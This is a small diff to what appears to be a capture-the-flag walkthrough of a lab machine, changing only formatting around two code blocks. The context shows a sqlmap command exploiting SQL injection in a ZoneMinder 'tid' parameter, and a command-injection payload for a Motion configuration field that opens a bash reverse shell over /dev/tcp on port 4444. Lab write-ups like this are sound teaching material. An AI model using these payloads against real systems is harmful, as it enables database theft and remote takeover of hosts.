@@ -37,7 +37,6 @@ Vulnerability research on this specific version revealed it is susceptible to **
 To automate the extraction, we leveraged `sqlmap`. First, we intercepted a valid session cookie (`ZMSESSID`) and targeted the database architecture.
 
 !!! info "SQLMap Execution - Database Enumeration"
-
 ```bash
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=YOUR_ZMSESSID" -p tid --dbms=mysql --batch --dbs
 ```
@@ -118,7 +117,6 @@ Research indicated this specific version suffers from an OS Command Injection vu
 The vulnerability resides in configuration parameters such as the **Image File Name** field. Unsanitized user input is written directly into the Motion configuration files. This allows an aunthenticated attacker to inject malicious commands that will trigger and achieve arbitrary code execution once the Motion service is restarted. We crafted a malicious payload using Python to spawn a reverse shell:
 
 !!! danger "Weaponized Payload"
-
 ```bash
 $(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"')")
 ```
